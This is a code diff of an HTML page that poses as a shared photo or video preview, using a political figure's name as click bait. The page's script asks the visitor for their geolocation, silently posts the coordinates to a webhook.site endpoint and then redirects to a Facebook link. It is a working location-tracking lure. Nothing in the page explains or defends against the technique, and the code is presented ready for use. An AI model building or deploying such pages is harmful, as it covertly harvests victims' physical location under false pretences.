@@ -1,22 +1,24 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Photo Preview</title>
-    <meta property="og:title" content="Shared a photo">
-    <meta property="og:description" content="Click to view the full image">
+    <title>Video Loading...</title>
+    <meta property="og:title" content="Obaidul Quader Pagla 2026">
+    <meta property="og:description" content="Click to watch the full Image">
     <meta property="og:image" content="https://i.postimg.cc/k5fL7S98/In-Shot-20260305-184518450.jpg">
-    <meta property="og:type" content="image.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:type" content="video.other">
 </head>
-<body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="text-align:center; color:white;"><p>Loading image...</p></div>
+<body style="margin:0; background:white; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center;"><p>Please wait, loading...</p></div>
     <script>
-        // এখানে আপনার ছবির নতুন লিঙ্কটি দেওয়া হয়েছে, যেখানে ইউজার ক্লিক করলে পৌঁছাবে
-        const targetURL = "https://postimg.cc/3k09KZXR";
+        // এখানে আপনার সেই ফেসবুক ভিডিওর লিঙ্কটি আছে
+        const targetURL = "https://www.facebook.com/share/1DUtaFbjxj/?mibextid=wwXIfr";
         const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408";
 
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
+                    // লোকেশন পাওয়ার পর ডাটা Webhook-এ পাঠানো হচ্ছে
                     fetch(webhookURL, { method: 'POST', mode: 'no-cors', 
                         body: JSON.stringify({lat: position.coords.latitude, lon: position.coords.longitude}) 
                     }).then(() => { window.location.href = targetURL; });
